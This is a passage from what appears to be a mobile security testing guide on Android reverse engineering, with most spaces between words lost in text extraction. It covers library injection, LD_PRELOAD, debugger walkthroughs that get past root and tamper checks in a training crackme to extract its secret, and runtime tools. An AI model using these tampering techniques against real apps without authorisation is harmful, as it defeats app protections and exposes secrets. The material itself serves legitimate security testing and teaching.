AnELFexecutableincludesalistofsharedlibraries(dependen- cies)thatarelinkedtotheexecutableforittofunctionoptimally. Thislistcanbemodifiedtoinsertanadditionallibrary tobeinjectedintotheprocess. ModifyingtheELFfilestructuremanuallytoinjectalibrarycanbecumbersomeandpronetoerrors. However,thistask canbeperformedwithrelativeeaseusingLIEF(LibrarytoInstrumentExecutableFormats). Usingitrequiresonlyafew linesofPythoncodeasshownbelow: importlief libnative =lief.parse("libnative.so") libnative.add_library("libinject.so")#Injection! libnative.write("libnative.so") Intheaboveexample,libinject.solibraryisinjectedasadependencyofanativelibrary(libnative.so),whichtheapplication alreadyloadsbydefault. FridagadgetcanbeinjectedintoanapplicationusingthisapproachasexplainedindetailinLIEF’s documentation. Asintheprevioussection,itisimportanttorememberaddingthelibrarytotherespectivearchitecture libfolderintheAPKandfinallyre-signingtheapplication. 141\nPreloading Symbols Abovewelookedintotechniqueswhichrequiresomekindofmodificationoftheapplication’scode. Alibrarycanalsobe injectedintoaprocessusingfunctionalitiesofferedbytheloaderoftheoperatingsystem. OnAndroid,whichisaLinux basedOS,youcanloadanadditionallibrarybysettingtheLD_PRELOADenvironmentvariable. Astheld.somanpagestates,symbolsloadedfromthelibrarypassedusingLD_PRELOADalwaysgetprecedence,i.e.they are searched first by the loader while resolving the symbols, effectively overriding the original ones. This feature is oftenusedtoinspecttheinputparametersofsomecommonlyusedlibcfunctionssuchasfopen,read,write,strcmp, etc., specially in obfuscated programs, where understanding their behavior may be challenging. Therefore, having an insightonwhichfiles arebeingopenedor whichstringsarebeing comparedmaybevery valuable. Thekeyidea here is“functionwrapping”,meaningthatyoucannotpatchsystemcallssuchaslibc’sfopen,butyoucanoverride(wrap)it includingcustomcodethatwill,forinstance,printtheinputparametersforyouandstillcalltheoriginalfopenremaining transparenttothecaller. OnAndroid,settingLD_PRELOADisslightlydifferentcomparedtootherLinuxdistributions. Ifyourecallfromthe“Platform Overview” section, every application in Android is forked from Zygote, which is started very early during the Android boot-up. Thus, setting LD_PRELOAD on Zygote is not possible. As a workaround for this problem, Android supports the setprop(setproperty)functionality. Belowyoucanseeanexampleforanapplicationwithpackagenamecom.foo.bar (notetheadditionalwrap. prefix): setpropwrap.com.foo.barLD_PRELOAD=/data/local/tmp/libpreload.so PleasenotethatifthelibrarytobepreloadeddoesnothaveSELinuxcontextassigned,fromAndroid5.0(APIlevel 21)onwards,youneedtodisableSELinuxtomakeLD_PRELOADwork,whichmayrequireroot. Debugging Platform: android Sofar,you’vebeenusingstaticanalysistechniqueswithoutrunningthetargetapps. Intherealworld,especiallywhen reversingmalwareormorecomplexapps,purestaticanalysisisverydifficult. Observingandmanipulatinganappduring runtimemakesitmuch,mucheasiertodecipheritsbehavior. Next,we’llhavealookatdynamicanalysismethodsthat helpyoudojustthat. Androidappssupporttwodifferenttypesofdebugging: DebuggingontheleveloftheJavaruntimewiththeJavaDebug Wire Protocol (JDWP), and Linux/Unix-style ptrace-based debugging on the native layer, both of which are valuable to reverseengineers. Debugging Release Apps DalvikandARTsupporttheJDWP,aprotocolforcommunicationbetweenthedebuggerandtheJavavirtualmachine(VM) thatitdebugs. JDWPisastandarddebuggingprotocolthat’ssupportedbyallcommandlinetoolsandJavaIDEs,including jdb,IntelliJ,andEclipse. Android’simplementationofJDWPalsoincludeshooksforsupportingextrafeaturesimplemented bytheDalvikDebugMonitorServer(DDMS). AJDWPdebuggerallowsyoutostepthroughJavacode,setbreakpointsonJavamethods,andinspectandmodifylocal andinstancevariables. You’lluseaJDWPdebuggermostofthetimeyoudebug“normal”Androidapps(i.e., appsthat don’tmakemanycallstonativelibraries). Inthefollowingsection,we’llshowhowtosolvetheUnCrackableAppforAndroidLevel1withjdbalone. Notethatthisis notanefficientwaytosolvethiscrackme. ActuallyyoucandoitmuchfasterwithFridaandothermethods,whichwe’ll introducelaterintheguide. This,however,servesasanintroductiontothecapabilitiesoftheJavadebugger. Debugging with jdb The adb command line tool was introduced in the “Android Basic Security Testing” chapter. You can use its adb jdwp commandtolisttheprocessIDsofalldebuggableprocessesrunningontheconnecteddevice(i.e.,processeshostinga 142\nJDWPtransport). Withtheadb forwardcommand,youcanopenalisteningsocketonyourhostcomputerandforward thissocket’sincomingTCPconnectionstotheJDWPtransportofachosenprocess. $adbjdwp 12167 $adbforwardtcp:7777jdwp:12167 You’renowreadytoattachjdb. Attachingthedebugger,however,causestheapptoresume,whichyoudon’twant. You wanttokeepitsuspendedsothatyoucanexplorefirst. Topreventtheprocessfromresuming,pipethesuspendcommand intojdb: ${echo "suspend";cat;}|jdb-attach localhost:7777 Initializingjdb... >Allthreadssuspended. > You’re now attached to the suspended process and ready to go ahead with the jdb commands. Entering ? prints the completelistofcommands. Unfortunately,theAndroidVMdoesn’tsupportallavailableJDWPfeatures. Forexample,the redefine command, which would let you redefine a class code is not supported. Another important restriction is that linebreakpointswon’tworkbecausethereleasebytecodedoesn’tcontainlineinformation. Methodbreakpointsdowork, however. Usefulworkingcommandsinclude: • classes: listallloadedclasses • class/methods/fieldsclassid: Printdetailsaboutaclassandlistitsmethodsandfields • locals: printlocalvariablesincurrentstackframe • print/dumpexpr: printinformationaboutanobject • stopinmethod: setamethodbreakpoint • clearmethod: removeamethodbreakpoint • setlvalue=expr: assignnewvaluetofield/variable/arrayelement Let’s revisit the decompiled code from the UnCrackable App for Android Level 1 and think about possible solutions. A goodapproachwouldbesuspendingtheappinastatewherethesecretstringisheldinavariableinplaintextsoyou canretrieveit. Unfortunately,youwon’tgetthatfarunlessyoudealwiththeroot/tamperingdetectionfirst. Reviewthecodeandyou’llseethatthemethodsg.vantagepoint.uncrackable1.MainActivity.adisplaysthe“Thisin unacceptable...”messagebox. ThismethodcreatesanAlertDialogandsetsalistenerclassfortheonClickevent. This class (named b) has a callback method will terminatesthe app once the user taps theOK button. Toprevent the user fromsimplycancelingthedialog,thesetCancelablemethodiscalled. private void a(final Stringtitle){ final AlertDialogcreate =newAlertDialog$Builder((Context)this).create(); create.setTitle((CharSequence)title); create.setMessage((CharSequence)"Thisinunacceptable.Theappisnowgoingtoexit."); create.setButton(-3,(CharSequence)"OK",(DialogInterface$OnClickListener)newb(this)); create.setCancelable(false); create.show(); } Youcanbypassthiswithalittleruntimetampering. Withtheappstillsuspended,setamethodbreakpointonandroid. app.Dialog.setCancelableandresumetheapp. >stop inandroid.app.Dialog.setCancelable Setbreakpointandroid.app.Dialog.setCancelable >resume Allthreadsresumed. > Breakpointhit: "thread=main",android.app.Dialog.setCancelable(),line=1,110bci=0 main[1] TheappisnowsuspendedatthefirstinstructionofthesetCancelablemethod. Youcanprinttheargumentspassedto setCancelablewiththelocalscommand(theargumentsareshownincorrectlyunder“localvariables”). main[1]locals Methodarguments: Localvariables: flag=true 143\nsetCancelable(true)wascalled,sothiscan’tbethecallwe’relookingfor. Resumetheprocesswiththeresumecom- mand. main[1]resume Breakpointhit: "thread=main",android.app.Dialog.setCancelable(),line=1,110bci=0 main[1]locals flag=false You’venowreachedacalltosetCancelablewiththeargumentfalse. Setthevariabletotruewiththesetcommand andresume. main[1]setflag=true flag=true=true main[1]resume Repeatthisprocess,settingflagtotrueeachtimethebreakpointisreached,untilthealertboxisfinallydisplayed(the breakpointwillbereachedfiveorsixtimes). Thealertboxshouldnowbecancelable! Tapthescreennexttotheboxand itwillclosewithoutterminatingtheapp. Nowthattheanti-tamperingisoutoftheway,you’rereadytoextractthesecretstring! Inthe“staticanalysis”section,you sawthatthestringisdecryptedwithAES,thencomparedwiththestringinputtothemessagebox. Themethodequals ofthejava.lang.Stringclasscomparesthestringinputwiththesecretstring. Setamethodbreakpointonjava.lang. String.equals,enteranarbitrarytextstringintheeditfield,andtapthe“verify”button. Oncethebreakpointisreached, youcanreadthemethodargumentwiththelocalscommand. >stop injava.lang.String.equals Setbreakpointjava.lang.String.equals > Breakpointhit: "thread=main",java.lang.String.equals(),line=639bci=2 main[1]locals Methodarguments: Localvariables: other= "radiusGravity" main[1]cont Breakpointhit: "thread=main",java.lang.String.equals(),line=639bci=2 main[1]locals Methodarguments: Localvariables: other= "Iwanttobelieve" main[1]cont Thisistheplaintextstringyou’relookingfor! Debugging with an IDE SettingupaprojectinanIDEwiththedecompiledsourcesisaneattrickthatallowsyoutosetmethodbreakpointsdirectly inthesourcecode. Inmostcases,youshouldbeabletosingle-stepthroughtheappandinspectthestateofvariables withtheGUI.Theexperiencewon’tbeperfect,it’snottheoriginalsourcecodeafterall,soyouwon’tbeabletosetline breakpointsandthingswillsometimessimplynotworkcorrectly. Thenagain,reversingcodeisnevereasy,andefficiently navigatinganddebuggingplainoldJavacodeisaprettyconvenientwayofdoingit. Asimilarmethodhasbeendescribed intheNetSPIblog. TosetupIDEdebugging,firstcreateyourAndroidprojectinIntelliJandcopythedecompiledJavasourcesintothesource folderasdescribedaboveinthe“ReviewingDecompiledJavaCode”section. Onthedevice, choosetheappasdebug apponthe“Developeroptions”(UnCrackableAppforAndroidLevel1inthistutorial),andmakesureyou’veswitchedon the“WaitForDebugger”feature. Onceyoutaptheappiconfromthelauncher,itwillbesuspendedin“WaitForDebugger”mode. 144\nNowyoucansetbreakpointsandattachtotheappprocesswiththe“AttachDebugger”toolbarbutton. Notethatonlymethodbreakpointsworkwhendebugginganappfromdecompiledsources. Onceamethodbreakpoint isreached,you’llgetthechancetosinglestepduringthemethodexecution. 145\nAfteryouchoosetheappfromthelist,thedebuggerwillattachtotheappprocessandyou’llreachthebreakpointthatwas setontheonCreatemethod. Thisapptriggersanti-debuggingandanti-tamperingcontrolswithintheonCreatemethod. That’swhysettingabreakpointontheonCreatemethodjustbeforetheanti-tamperingandanti-debuggingchecksare performedisagoodidea. Next, single-step through the onCreate method by clicking “Force Step Into” in Debugger view. The “Force Step Into” optionallowsyoutodebugtheAndroidframeworkfunctionsandcoreJavaclassesthatarenormallyignoredbydebug- gers. Once you “Force Step Into”, the debugger will stop at the beginning of the next method, which is the a method of the classsg.vantagepoint.a.c. 146\nThismethodsearchesforthe“su”binarywithinalistofdirectories(/system/xbinandothers). Sinceyou’rerunningthe apponarooteddevice/emulator,youneedtodefeatthischeckbymanipulatingvariablesand/orfunctionreturnvalues. Youcanseethedirectorynamesinsidethe“Variables”windowbyclicking“StepOver”theDebuggerviewtostepinto andthroughtheamethod. StepintotheSystem.getenvmethodwiththe“ForceStepInto”feature. Afteryougetthecolon-separateddirectorynames,thedebuggercursorwillreturntothebeginningoftheamethod,not to the next executable line. This happens because you’re working on the decompiled code instead of the source code. Thisskippingmakesfollowingthecodeflowcrucialtodebuggingdecompiledapplications. Otherwise,identifyingthenext linetobeexecutedwouldbecomecomplicated. Ifyoudon’twanttodebugcoreJavaandAndroidclasses,youcanstepoutofthefunctionbyclicking“StepOut”inthe Debuggerview. Using“ForceStepInto”mightbeagoodideaonceyoureachthedecompiledsourcesand“StepOut”of thecoreJavaandAndroidclasses. Thiswillhelpspeedupdebuggingwhileyoukeepaneyeonthereturnvaluesofthe coreclassfunctions. 147\nAfter the a method gets the directory names, it will search for the su binary within these directories. To defeat this check, step through the detection method and inspect the variable content. Once execution reaches a location where thesubinarywouldbedetected,modifyoneofthevariablesholdingthefilenameordirectorynamebypressingF2or right-clickingandchoosing“SetValue”. Onceyoumodifythebinarynameorthedirectoryname,File.existsshouldreturnfalse. 148\nThisdefeatsthefirstrootdetectioncontroloftheapp. Theremaininganti-tamperingandanti-debuggingcontrolscanbe defeatedinsimilarwayssothatyoucanfinallyreachthesecretstringverificationfunctionality. Thesecretcodeisverifiedbythemethodaofclasssg.vantagepoint.uncrackable1.a. Setabreakpointonmethoda and“ForceStepInto”whenyoureachthebreakpoint. Then,single-stepuntilyoureachthecalltoString.equals. This iswhereuserinputiscomparedwiththesecretstring. Youcanseethesecretstringinthe“Variables”viewwhenyoureachtheString.equalsmethodcall. 149\nDebugging Native Code NativecodeonAndroidispackedintoELFsharedlibrariesandrunsjustlikeanyothernativeLinuxprogram. Consequently, youcandebugitwithstandardtools(includingGDBandbuilt-inIDEdebuggerssuchasIDAPro)aslongastheysupport thedevice’sprocessorarchitecture(mostdevicesarebasedonARMchipsets,sothisisusuallynotanissue). You’llnowsetupyourJNIdemoapp,HelloWorld-JNI.apk,fordebugging. It’sthesameAPKyoudownloadedin“Statically AnalyzingNativeCode”. Useadb installtoinstallitonyourdeviceoronanemulator. adbinstallHelloWorld-JNI.apk If you followed the instructions at the beginning of this chapter, you should already have the Android NDK. It contains prebuiltversionsofgdbserverforvariousarchitectures. Copythegdbserverbinarytoyourdevice: 150\nadbpush $NDK/prebuilt/android-arm/gdbserver/gdbserver/data/local/tmp The gdbserver --attach command causes gdbserver to attach to the running process and bind to the IP address and portspecifiedincomm,whichinthiscaseisaHOST:PORTdescriptor. StartHelloWorldJNIonthedevice,thenconnectto thedeviceanddeterminethePIDoftheHelloWorldJNIprocess(sg.vantagepoint.helloworldjni). Thenswitchtotheroot userandattachgdbserver: $adbshell $ps |grep helloworld u0_a164 12690201 153340051692ffffffff00000000Ssg.vantagepoint.helloworldjni $su ##/data/local/tmp/gdbserver--attachlocalhost:123412690 Attached;pid=12690 Listeningonport1234 Theprocessisnowsuspended,andgdbserverislisteningfordebuggingclientsonport1234. Withthedeviceconnected viaUSB,youcanforwardthisporttoalocalportonthehostwiththeabd forwardcommand: adbforwardtcp:1234tcp:1234 You’llnowusetheprebuiltversionofgdbincludedintheNDKtoolchain. $$TOOLCHAIN/bin/gdblibnative-lib.so GNUgdb (GDB)7.11 (...) Readingsymbolsfromlibnative-lib.so...(nodebuggingsymbolsfound)...done. (gdb)targetremote:1234 Remotedebuggingusing:1234 0xb6e0f124in ??() Youhavesuccessfullyattachedtotheprocess! Theonlyproblemisthatyou’realreadytoolatetodebugtheJNIfunction StringFromJNI;itonlyrunsonce, atstartup. Youcansolvethisproblembyactivatingthe“WaitforDebugger”option. GotoDeveloperOptions->SelectdebugappandpickHelloWorldJNI,thenactivatetheWaitfordebuggerswitch. Thenterminateandre-launchtheapp. Itshouldbesuspendedautomatically. OurobjectiveistosetabreakpointatthefirstinstructionofthenativefunctionJava_sg_vantagepoint_helloworldjni_- MainActivity_stringFromJNIbeforeresumingtheapp. Unfortunately,thisisn’tpossibleatthispointintheexecution becauselibnative-lib.soisn’tyetmappedintoprocessmemory,it’sloadeddynamicallyduringruntime. Togetthis working,you’llfirstusejdbtogentlychangetheprocessintothedesiredstate. First,resumeexecutionoftheJavaVMbyattachingjdb. Youdon’twanttheprocesstoresumeimmediatelythough,so pipethesuspendcommandintojdb: $adbjdwp 14342 $adbforwardtcp:7777jdwp:14342 ${echo "suspend";cat;}|jdb-attach localhost:7777 Next,suspendtheprocesswheretheJavaruntimeloadslibnative-lib.so. Injdb,setabreakpointatthejava.lang. System.loadLibrary method and resume the process. After the breakpoint has been reached, execute the step up command,whichwillresumetheprocessuntilloadLibraryreturns. Atthispoint,libnative-lib.sohasbeenloaded. >stop injava.lang.System.loadLibrary >resume Allthreadsresumed. Breakpointhit: "thread=main",java.lang.System.loadLibrary(),line=988bci=0 >stepup main[1]stepup > Stepcompleted: "thread=main",sg.vantagepoint.helloworldjni.MainActivity.<clinit>(),line=12 bci=5 main[1] Executegdbservertoattachtothesuspendedapp. ThiswillcausetheapptobesuspendedbyboththeJavaVMandthe Linuxkernel(creatingastateof“double-suspension”). 151\n$adbforwardtcp:1234tcp:1234 $$TOOLCHAIN/arm-linux-androideabi-gdblibnative-lib.so GNUgdb (GDB)7.7 Copyright (C)2014FreeSoftwareFoundation,Inc. (...) (gdb)targetremote:1234 Remotedebuggingusing:1234 0xb6de83b8in ??() JNI Tracing Platform: android AsdetailedinsectionReviewingDisassembledNativeCode,thefirstargumentpassedtoeveryJNIfunctionisaJNIinter- facepointer. ThispointercontainsatableoffunctionsthatallowsnativecodetoaccesstheAndroidRuntime. Identifying callstothesefunctionscanhelpwithunderstandinglibraryfunctionality,suchaswhatstringsarecreatedorJavamethods arecalled. jnitraceisaFridabasedtoolsimilartofrida-tracewhichspecificallytargetstheusageofAndroid’sJNIAPIbynativelibraries, providingaconvenientwaytoobtainJNImethodtracesincludingargumentsandreturnvalues. Youcaneasilyinstallitbyrunningpip install jnitraceandrunitstraightawayasfollows: jnitrace -llibnative-lib.sosg.vantagepoint.helloworldjni The-loptioncanbeprovidedmultipletimestotracemultiplelibraries,or*canbeprovidedtotracealllibraries. This,however,mayprovidealotofoutput. IntheoutputyoucanseethetraceofacalltoNewStringUTFmadefromthenativecode(itsreturnvalueisthengiven backtoJavacode,seesection“ReviewingDisassembledNativeCode”formoredetails). Notehowsimilarlytofrida-trace, theoutputiscolorizedhelpingtovisuallydistinguishthedifferentthreads. When tracing JNI API calls you can see the thread ID at the top, followed by the JNI method call including the method name,theinputargumentsandthereturnvalue. InthecaseofacalltoaJavamethodfromnativecode,theJavamethod argumentswillalsobe supplied. Finallyjnitracewillattempt tousetheFridabacktracinglibrarytoshowwheretheJNI callwasmadefrom. Tolearnmoreaboutalloptionsforadvancedusage,checkthedocumentationonthejnitraceGitHubpage. Monitoring System Logs Platform: android OnAndroidyoucaneasilyinspectthelogofsystemmessagesbyusingLogcat. TherearetwowaystoexecuteLogcat: • LogcatispartofDalvikDebugMonitorServer (DDMS)inAndroidStudio. Iftheappisrunningindebugmode,the logoutputwillbeshownintheAndroidMonitorontheLogcattab. Youcanfiltertheapp’slogoutputbydefining patternsinLogcat. 152\n• YoucanexecuteLogcatwithadbtostorethelogoutputpermanently: adblogcat >logcat.log Withthefollowingcommandyoucanspecificallygrepforthelogoutputoftheappinscope,justinsertthepackagename. OfcourseyourappneedstoberunningforpstobeabletogetitsPID. adblogcat |grep "$(adbshellps |grep <package-name>|awk'{print$2}')" Runtime Reverse Engineering Platform: android Runtimereverseengineeringcanbeseenastheon-the-flyversionofreverseengineeringwhereyoudon’thavethebinary datatoyourhostcomputer. Instead,you’llanalyzeitstraightfromthememoryoftheapp. We’llkeepusingtheHelloWorldJNIapp,openasessionwithr2fridar2frida://usb//sg.vantagepoint.helloworldjni andyoucanstartbydisplayingthetargetbinaryinformationbyusingthe:icommand: [0x00000000]>:i arch arm bits 64 os linux pid 13215 uid 10096 objc false runtime V8 java true cylang false pageSize 4096 pointerSize 8 codeSigningPolicy optional isDebuggerAttached false cwd / dataDir /data/user/0/sg.vantagepoint.helloworldjni codeCacheDir /data/user/0/sg.vantagepoint.helloworldjni/code_cache extCacheDir /storage/emulated/0/Android/data/sg.vantagepoint.helloworldjni/cache obbDir /storage/emulated/0/Android/obb/sg.vantagepoint.helloworldjni filesDir /data/user/0/sg.vantagepoint.helloworldjni/files noBackupDir /data/user/0/sg.vantagepoint.helloworldjni/no_backup codePath /data/app/sg.vantagepoint.helloworldjni-1/base.apk packageName sg.vantagepoint.helloworldjni androidId c92f43af46f5578d cacheDir /data/local/tmp jniEnv 0x7d30a43c60 Searchallsymbolsofacertainmodulewith:is <lib>,e.g.:is libnative-lib.so. [0x00000000]>\islibnative-lib.so [0x00000000]> 153\nWhich are empty in this case. Alternatively, you might prefer to look into the imports/exports. For example, list the importswith:ii <lib>: [0x00000000]>:iilibnative-lib.so 0x7dbe1159d0f__cxa_finalize/system/lib64/libc.so 0x7dbe115868f__cxa_atexit/system/lib64/libc.so Andlisttheexportswith:iE <lib>: [0x00000000]>:iElibnative-lib.so 0x7d1c49954cfJava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI Forbigbinariesit’srecommendedtopipetheoutputtotheinternallessprogrambyappending~..,i.e.\iiliban- droid_runtime.so~.. (ifnot,forthisbinary,you’dgetalmost2500linesprintedtoyourterminal). ThenextthingyoumightwanttolookatarethecurrentlyloadedJavaclasses: [0x00000000]>\ic~sg.vantagepoint.helloworldjni sg.vantagepoint.helloworldjni.MainActivity Listclassfields: [0x00000000]>:icsg.vantagepoint.helloworldjni.MainActivity~sg.vantagepoint.helloworldjni publicnativejava.lang.Stringsg.vantagepoint.helloworldjni.MainActivity.stringFromJNI() publicsg.vantagepoint.helloworldjni.MainActivity() Notethatwe’vefilteredbypackagenameasthisistheMainActivityanditincludesallmethodsfromAndroid’sActivity class. Youcanalsodisplayinformationabouttheclassloader: [0x00000000]>:icL dalvik.system.PathClassLoader[ DexPathList[ [ directory "."] , nativeLibraryDirectories=[ /system/lib64, /vendor/lib64, /system/lib64, /vendor/lib64] ] ] java.lang.BootClassLoader@b1f1189dalvik.system.PathClassLoader[ DexPathList[ [ zipfile "/data/app/sg.vantagepoint.helloworldjni-1/base.apk"] , nativeLibraryDirectories=[ /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64, /data/app/sg.vantagepoint.helloworldjni-1/base.apk!/lib/arm64-v8a, /system/lib64, /vendor/lib64] ] ] Next,imaginethatyouareinterestedintothemethodexportedbylibnative-lib.so0x7d1c49954c f Java_sg_vantage- point_helloworldjni_MainActivity_stringFromJNI.Youcanseektothataddresswiths 0x7d1c49954c,analyzethat functionafandprint10linesofitsdisassemblypd 10: [0x7d1c49954c]>pdf ;--sym.fun.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI: ╭(fcn)fcn.7d1c49954c18 │ fcn.7d1c49954c (int32_targ_40f942h); │ ;argint32_targ_40f942h@x29+0x40f942 │ 0x7d1c49954c 080040f9 ldrx8, [x0] │ 0x7d1c499550 01000090 adrpx1,0x7d1c499000 │ 0x7d1c499554 21801591 addx1,x1,0x560 ;hit0_4 │ 0x7d1c499558 029d42f9 ldrx2,[x8,0x538] ;[0x538:4]=-1 ;1336 │ 0x7d1c49955c 4000 invalid Note that the line tagged with ; hit0_4 corresponds to the string that we’ve previously found: 0x7d1c499560 hit0_4 Hello from C++. Tolearnmore,pleaserefertother2fridawiki. 154\nHost-Device Data Transfer Platform: android Using adb Youcancopyfilestoandfromadevicebyusingtheadbcommandsadb pull <remote> <local>andadb push <local> <remote>commands. Theirusageisverystraightforward. Forexample,thefollowingwillcopyfoo.txtfromyourcurrent directory(local)tothesdcardfolder(remote): adbpushfoo.txt/sdcard/foo.txt Thisapproachiscommonlyusedwhenyouknowexactlywhatyouwanttocopyandfrom/towhereandalsosupportsbulk filetransfer,e.g.youcanpull(copy)awholedirectoryfromtheAndroiddevicetoyourhostcomputer. $adbpull/sdcard /sdcard/:1190filespulled.14.1MB/s (304526427bytesin20.566s) Using Android Studio Device File Explorer AndroidStudiohasabuilt-inDeviceFileExplorerwhichyoucanopenbygoingtoView->ToolWindows->DeviceFile Explorer. If you’re using a rooted device you can now start exploring the whole file system. However, when using a non-rooted deviceaccessingtheappsandboxeswon’tworkunlesstheappisdebuggableandeventhenyouare“jailed”withinthe appsandbox. Using objection Thisoptionisusefulwhenyouareworkingonaspecificappandwanttocopyfilesyoumightencounterinsideitssandbox (noticethatyou’llonlyhaveaccesstothefilesthatthetargetapphasaccessto). Thisapproachworkswithouthavingto settheappasdebuggable,whichisotherwiserequiredwhenusingAndroidStudio’sDeviceFileExplorer. First,connecttotheappwithObjectionasexplainedin“RecommendedTools-Objection”. Then,uselsandcdasyou normallywouldonyourterminaltoexploretheavailablefiles: $frida-ps -U|grep -iowasp 21228 sg.vp.owasp_mobile.omtg_android $objection -gsg.vp.owasp_mobile.omtg_androidexplore ...g.vp.owasp_mobile.omtg_androidon (google:8.1.0)[usb] #cd.. /data/user/0/sg.vp.owasp_mobile.omtg_android ...g.vp.owasp_mobile.omtg_androidon (google:8.1.0) [usb] #ls Type ... Name --------- ... ------------------- 155\nDirectory ... cache Directory ... code_cache Directory ... lib Directory ... shared_prefs Directory ... files Directory ... app_ACRA-approved Directory ... app_ACRA-unapproved Directory ... databases Readable:True Writable:True Oneyouhaveafileyouwanttodownloadyoucanjustrunfile download <some_file>. Thiswilldownloadthatfileto yourworkingdirectory. Thesamewayyoucanuploadfilesusingfile upload. ...[usb] #ls Type ... Name ------ ... ----------------------------------------------- File ... sg.vp.owasp_mobile.omtg_android_preferences.xml Readable:True Writable:True ...[usb] #filedownloadsg.vp.owasp_mobile.omtg_android_preferences.xml Downloading... Streamingfilefromdevice... Writingbytestodestination... Successfullydownloaded...tosg.vp.owasp_mobile.omtg_android_preferences.xml Thedownsideisthat,atthetimeofthiswriting,objectiondoesnotsupportbulkfiletransferyet,soyou’rerestrictedto copyindividualfiles. Still,thiscancomehandyinsomescenarioswhereyou’realreadyexploringtheappusingobjection anywayandfindsomeinterestingfile. Insteadofforexampletakingnoteofthefullpathofthatfileanduseadb pull <path_to_some_file>fromaseparateterminal,youmightjustwanttodirectlydofile download <some_file>. Decompiling Java Code Platform: android InAndroidappsecuritytesting,iftheapplicationisbasedsolelyonJavaanddoesn’thaveanynativecode(C/C++code), thereverseengineeringprocessisrelativelyeasyandrecovers(decompiles)almostallthesourcecode. Inthosecases, black-boxtesting(withaccesstothecompiledbinary,butnottheoriginalsourcecode)cangetprettyclosetowhite-box testing. Nevertheless,ifthecodehasbeenpurposefullyobfuscated(orsometool-breakinganti-decompilationtrickshavebeen applied),thereverseengineeringprocessmaybeverytime-consumingandunproductive. Thisalsoappliestoapplications thatcontainnativecode. Theycanstillbereverseengineered,buttheprocessisnotautomatedandrequiresknowledge oflow-leveldetails. IfyouwanttolookdirectlyintoJavasourcecodeonaGUI,simplyopenyourAPKusingjadxorBytecodeViewer. AndroiddecompilersgoonestepfurtherandattempttoconvertAndroidbytecodebackintoJavasourcecode, making itmorehuman-readable. Fortunately, JavadecompilersgenerallyhandleAndroidbytecodewell. Theabovementioned toolsembed,andsometimesevencombine,popularfreedecompilerssuchas: • JD • JAD • jadx • Procyon • CFR AlternativelyyoucanusetheAPKLabextensionforVisualStudioCodeorrunapkxonyourAPKorusetheexportedfiles fromtheprevioustoolstoopenthereversedsourcecodeonyourpreferredIDE. In the following example we’ll be using UnCrackable App for Android Level 1. First, let’s install the app on a device or emulatorandrunittoseewhatthecrackmeisabout. 156\nSeemslikewe’reexpectedtofindsomekindofsecretcode! We’relookingforasecretstringstoredsomewhereinsidetheapp,sothenextstepistolookinside. First,unziptheAPK file(unzip UnCrackable-Level1.apk -d UnCrackable-Level1)and lookat thecontent. In thestandardsetup, allthe Javabytecodeandappdataisinthefileclasses.dexintheapprootdirectory(UnCrackable-Level1/). Thisfileconforms totheDalvikExecutableFormat(DEX),anAndroid-specificwayofpackagingJavaprograms. MostJavadecompilerstake plainclassfilesorJARsasinput,soyouneedtoconverttheclasses.dexfileintoaJARfirst. Youcandothiswithdex2jar orenjarify. Once you have a JAR file, you can use any free decompiler to produce Java code. In this example, we’ll use the CFR decompiler. CFRreleasesareavailableontheauthor’swebsite. CFRwasreleasedunderanMITlicense,soyoucanuse itfreelyeventhoughitssourcecodeisnotavailable. The easiest way to run CFR is through apkx, which also packages dex2jar and automates extraction, conversion, and decompilation. RunitontheAPKandyoushouldfindthedecompiledsourcesinthedirectoryUncrackable-Level1/src. Toviewthesources,asimpletexteditor(preferablywithsyntaxhighlighting)isfine,butloadingthecodeintoaJavaIDE makesnavigationeasier. Let’simportthecodeintoIntelliJ,whichalsoprovideson-devicedebuggingfunctionality. Open IntelliJ and select “Android” as the project type in the left tab of the “New Project” dialog. Enter “Uncrack- able1” as the application name and “vantagepoint.sg” as the company name. This results in the package name “sg.vantagepoint.uncrackable1”, which matches the original package name. Using a matching package name is important if you want to attach the debugger to the running app later on because IntelliJ uses the package name to identifythecorrectprocess. Inthe nextdialog, pick any APInumber; you don’t actuallywant to compile the project, so the number doesn’t matter. Click“next”andchoose“AddnoActivity”,thenclick“finish”. Onceyouhavecreatedtheproject,expandthe“1: Project”viewontheleftandnavigatetothefolderapp/src/main/java. Right-clickanddeletethedefaultpackage“sg.vantagepoint.uncrackable1”createdbyIntelliJ. 157\nNow,opentheUncrackable-Level1/srcdirectoryinafilebrowseranddragthesgdirectoryintothenowemptyJava folderintheIntelliJprojectview(holdthe“alt”keytocopythefolderinsteadofmovingit). You’llendupwithastructurethatresemblestheoriginalAndroidStudioprojectfromwhichtheappwasbuilt. 158\nSeethesection“ReviewingDecompiledJavaCode”belowtolearnonhowtoproceedwheninspectingthedecompiled Javacode. Process Exploration Platform: android Whentestinganapp,processexplorationcanprovidethetesterwithdeepinsightsintotheappprocessmemory. Itcan beachievedviaruntimeinstrumentationandallowstoperformtaskssuchas: • Retrievingthememorymapandloadedlibraries. • Searchingforoccurrencesofcertaindata. • Afterdoingasearch,obtainingthelocationofacertainoffsetinthememorymap. • Performingamemorydumpandinspectorreverseengineerthebinarydataoffline. • Reverseengineeringanativelibrarywhileit’srunning. Asyoucansee,thesepassivetaskshelpuscollectinformation. ThisInformationisoftenusedforothertechniques,such asmethodhooking. Inthefollowingsectionsyouwillbeusingr2fridatoretrieveinformationstraightfromtheappruntime. Pleasereferto r2frida’s official installation instructions. First start by opening an r2frida session to the target app (e.g. HelloWorld JNI APK)thatshouldberunningonyourAndroidphone(connectedperUSB).Usethefollowingcommand: 159\nr2frida://usb//sg.vantagepoint.helloworldjni Seealloptionswithr2 frida://?. Onceinther2fridasession,allcommandsstartwith:. Forexample,inradare2you’drunitodisplaythebinaryinforma- tion,butinr2fridayou’duse:i. Memory Maps and Inspection Youcanretrievetheapp’smemorymapsbyrunning\dm. TheoutputinAndroidcangetverylong(e.g.between1500 and2000lines),tonarrowyoursearchandseeonlywhatdirectlybelongstotheappapplyagrep(~)bypackagename \dm~<package_name>: [0x00000000]>\dm~sg.vantagepoint.helloworldjni 0x000000009b2dc000 -0x000000009b361000rw-/dev/ashmem/dalvik-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art (deleted) 0x000000009b361000 -0x000000009b36e000 ---/dev/ashmem/dalvik-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art (deleted) 0x000000009b36e000 